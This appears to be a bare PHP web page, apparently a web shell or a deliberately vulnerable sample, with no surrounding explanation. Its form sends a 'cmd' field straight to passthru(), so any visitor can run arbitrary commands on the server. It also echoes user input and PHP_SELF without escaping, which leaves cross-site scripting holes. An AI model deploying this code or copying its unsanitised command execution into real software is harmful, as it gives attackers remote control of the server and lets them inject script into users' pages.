<html>
<head>
<title> </title>
</head>
<body>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
 $input = $_POST['input'];
}
?>

<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
 <select name="cmd">
   <option value="<?php echo $input;?>"><?php echo $input;?></option>
 </select>
 <input type ="submit">
</form>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {

 $cmd = $_POST['cmd'];
 $output = passthru($cmd);
 echo $output;
}
?>

</body>
</html>
